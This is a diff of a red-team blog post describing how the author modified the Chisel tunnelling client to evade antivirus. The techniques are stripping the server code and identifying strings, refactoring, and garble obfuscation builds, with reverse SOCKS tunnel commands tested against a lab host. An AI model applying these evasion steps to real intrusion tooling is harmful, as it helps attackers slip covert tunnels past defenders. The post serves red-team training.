@@ -1,5 +1,5 @@
 ---
-title: AV Evasion w Chisel
+title: AV Evasion with Chisel
 draft: false
 tags:
   - chisel
@@ -11,13 +11,12 @@ tags:
   - go
   - redteam
 ---
-# AV Evasion w Chisel: From 16/65 to 2/65 flagged on VT
+# Chisel Client: From 16/65 to 1/65 flagged on VT
 ## Introduction
 
+I recently had the opportunity to beta test an excellent course, **RTL (RedTeamLite)**, created by [Red Raccoon](https://www.redraccoon.kr/). One of the chapters provided a customized Chisel client source code that the instructors successfully reduced to **4/65 detections** on VirusTotal. Intrigued, I decided to take on the challenge myself — aiming to match or even surpass their result. By the end of this blog post, I managed to reduce the detection rate from **16/65** to just **1/65** on VirusTotal.
 
-I recently had the opportunity to beta test an excellent course, **RTL (RedTeamLite)**, created by [Red Raccoon](https://www.redraccoon.kr/). One of the chapters provided a customized Chisel client source code that the instructors successfully reduced to **4/65 detections** on VirusTotal. Intrigued, I decided to take on the challenge myself — aiming to match or even surpass their result. By the end of this experiment, I managed to reduce the detection rate from **16/65** to just **2/65** on VirusTotal.
-
-In this post, I’ll walk you through the **six techniques** I used to achieve AV evasion with Chisel:
+In this post, I’ll walk you through the **five techniques** I used to achieve AV evasion with Chisel:
 
 - Server Functionality Removal
 - Hardcoded String Removal
@@ -25,12 +24,12 @@ In this post, I’ll walk you through the **six techniques** I used to achieve A
 - Refactoring Code Structure
 - Building with Obfuscation
 
-Special thanks to `@choi` and `@groot` for their invaluable insights shared during the RTL course.
+> Special thanks to `@choi` and `@groot` for their invaluable insights shared during the RTL course.
 ## Original Chisel Analysis
 
 Before diving into the AV evasion techniques, it’s important to take a quick look at [Chisel](https://github.com/jpillora/chisel)’s original source structure to understand what we’re working with.
 
-```
+```ruby
 yoon@yoon-XH695R:~/Documents/chisel_custom/chisel-master$ ls -al
 total 88
 drwxr-xr-x 8 root root  4096 Sep 29  2024 .
@@ -267,7 +266,7 @@ Just to be safe, let's test if the modified Chisel client works fine/
 
 On our local machine, we will spawn a listener using original Chisel's server:
 
-```
+```scss
 yoon@yoon-XH695R:~/Documents/chisel_custom/chisel-master$ sudo ./chisel server -p 443 --reverse --socks5 --auth 'blah:blah'
 2025/06/15 22:43:32 server: Reverse tunnelling enabled
 2025/06/15 22:43:32 server: Fingerprint RsXMzOWZKimqtkiKZNEJNW1ZPPH/lhCee9/qn1QfXaM=
@@ -279,7 +278,7 @@ yoon@yoon-XH695R:~/Documents/chisel_custom/chisel-master$ sudo ./chisel server -
 
 On the target machine, try making a connection to the listener using the customized Chisel client:
 
-```
+```scss
 ┌──(carabiner1㉿carabiner)-[~/Documents]
 └─$ ./chisel_wo_server client --auth 'blah:blah' 192.168.107.54:443 R:socks
 
@@ -295,7 +294,7 @@ We need more customization. Let's move on.
 
 Run these commands inside your `chisel-master` folder to locate all occurrences:
 
-```
+```scss
 grep -r "chisel"
 grep -r "jpillora"
 grep -r "BuildVersion"
@@ -320,11 +319,11 @@ These hardcoded strings are usually in:
 - `share/cos/*.go` → if there’s help text or debug output
 - `share/tunnel/*.go` → if there are banner messages
 
-We could create a automation script for doing this but I decided to do this manually. Creating a simple bash script for this would be a great idea.
+We could create a automation script for doing this but I decided to do this manually. 
 
 For example, on `main.go`, we can see text messages for the `--help` flag:
 
-```
+```go
 var clientHelp = `
   Usage:  client [options] <server> <remote> [remote] [remote] ...
 
@@ -354,7 +353,7 @@ Look around the file system, searching for keywords like `chisel`, `server`, `jp
 
 After manually deleting/removing hardcoded texts, build it again:
 
-```
+```scss
 yoon@yoon-XH695R:~/Documents/workplace2/chisel-masterwoserver$ sudo go build -ldflags="-s -w" -o chisel_noserver_hardcode
 ```
 
@@ -377,7 +376,7 @@ After building and uploading to VT, we get 10/65 flagged:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/AV/chisel/6.png)
 
-on `filescan.io`, it is marked as `Suspicious`:
+On `filescan.io`, it is marked as `Suspicious`:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/AV/chisel/7.png)
 
@@ -419,7 +418,7 @@ Let's build and upload to VT to test on it again:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/AV/chisel/8.png)
 
-Sadly that didn't do much. We are still stuck `10/65`
+Sadly that didn't do much. We are still stuck `10/65`.
 
 ## 4-Refactor Code Structure
 
@@ -543,13 +542,12 @@ func (h *headerMap) Set(arg string) error {
 }
 ```
 
-
 To check on fully refactored `main.go`, check on `Code 2` at Appendix.
 
 Now that we have gone through some basic refactoring, let's build & upload on VT again:
 
 
-obsidian://open?vault=RTL&file=pics%2FPasted%20image%2020250615232527.png
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/RedTeam/AV/chisel/99.png)
 
 Now we got it down to `9/65 flagged`.
 
@@ -560,7 +558,7 @@ Let's use [Garble](https://github.com/burrowers/garble) to build with obfuscatio
 
 > **Go Garble** is a compiler wrapper for Go that obfuscates Go binaries to make reverse engineering and static analysis harder. It works by renaming symbols, removing debug information, and applying other transformations while preserving normal functionality.
 
-First download `garble`:
+First download `garble` if you don't have it already:
 
 ```
 yoon@yoon-XH695R:~/Documents/workplace2$ go install mvdan.cc/garble@latest
@@ -575,7 +573,7 @@ go: downloading github.com/bluekeyes/go-gitdiff v0.8.1
 
 Below command will strip out debug info, paths, and apply aggressive size and symbol obfuscation to hinder reverse engineering:
 
-```ruby
+```scss
 yoon@yoon-XH695R:~/Documents/workplace2/chisel-masterwoserver$ garble --tiny build -ldflags="-s -w" -trimpath -o garble2 .
 ```
 
@@ -591,7 +589,7 @@ Just to be sure, let's test if this build works fine.
 
 On target machine:
 
-```
+```scss
 ┌──(carabiner1㉿carabiner)-[~/Documents]
 └─$ ./garble2 client --auth 'blah:blah' 192.168.107.54:443 R:socks
 doUselessWork called
@@ -603,7 +601,7 @@ Junk output: junk
 
 On listener machine:
 
-```
+```scss
 yoon@yoon-XH695R:~/Documents/chisel-master$ sudo ./chisel server -p 443 --reverse --socks5 --auth 'blah:blah'
 [sudo] password for yoon: 
 2025/06/16 22:40:19 server: Reverse tunnelling enabled
@@ -625,7 +623,7 @@ Let's implement the below to `garble` command:
 - Clear the build ID
 - Tell the linker to statically link external dependencies
 
-```
+```scss
 yoon@yoon-XH695R:~/Documents/workplace2/chisel-masterwoserver$ garble --seed=random --literals --tiny build -ldflags="-s -w -buildid= -extldflags=-static" -trimpath -o garble_stealth .
 -seed chosen at random: j8+Puzp8cywpbg+1ZBacQA
 # github.com/jpillora/chisel
@@ -639,13 +637,21 @@ Upon building and uploading to VT, we managed to get it down to `1/65` flagged:
 
 ## Summary
 
-We successfully customized the Chisel client’s build process to reduce detections on VirusTotal from 16/65 flagged down to 1/65 flagged. Despite multiple attempts and advanced build techniques, achieving a 0/65 detection rate remains elusive. If anyone manages to reach this milestone, I’d be very interested in learning their approach and techniques.
+Alright. We have successfully customized the Chisel client's build process to reduce detections on VirusTotal from `16/65` to `1/65`. 
+
+I wish we could have got it down to `0/65` but I will leave this part to the readers of this post. If anyone manages to reach this milestone, I'd be interested in learning how you did it.
+
+AV Evasion sounded hard, but it was pretty fun to play with.
+
+For the next coming project, I am thinking of creating personal AV Evasion lab. Hopefully, I will be sharing soon. 
+
+Untill then...
 
 Again, special thanks to `@choi` and `@groot`. 
 
 I will be back. 
 ## Reference
-RTL
+- RTL (Red Team Lite) from [Red Raccoon](https://www.redraccoon.kr/)
 
 ## Appendix 
 
